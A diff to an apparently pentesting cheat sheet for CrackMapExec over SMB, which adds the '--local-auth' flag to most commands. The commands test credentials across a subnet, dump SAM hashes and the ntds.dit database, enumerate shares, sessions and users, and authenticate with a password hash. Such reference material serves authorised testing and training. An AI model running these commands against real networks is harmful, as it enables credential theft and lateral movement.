@@ -41,28 +41,28 @@ crackmapexec <protocol> <target-IP> -u <user or userlist> -p <password or passwo
 
 ```bash
 # Check if we can access a machine
-crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN>
+crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN>
 
 # Check which machines we can access in a subnet
 crackmapexec smb $ip/24 -u <username> -p <password> -d <DOMAIN>
 
 # Get sam: all users authenticated in the machine and their hashes
-crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --sam
+crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --sam
 
 # Get the ntds.dit, given that your user has permissions
-crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --ntds
+crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --ntds
 
 # See shares
-crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --shares
+crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --shares
 
 # Enumerate active sessions
-crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --sessions
+crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --sessions
 
 # Enumerate users of the domain
-crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --users
+crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --users
 
 # Enumerate logged on users
-crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --loggedon-users
+crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --loggedon-users
 
 # Using a hash instead of a password, to authenticate ourselves
 crackmapexec smb $ip -u <username> -H <hash> -d <DOMAIN>
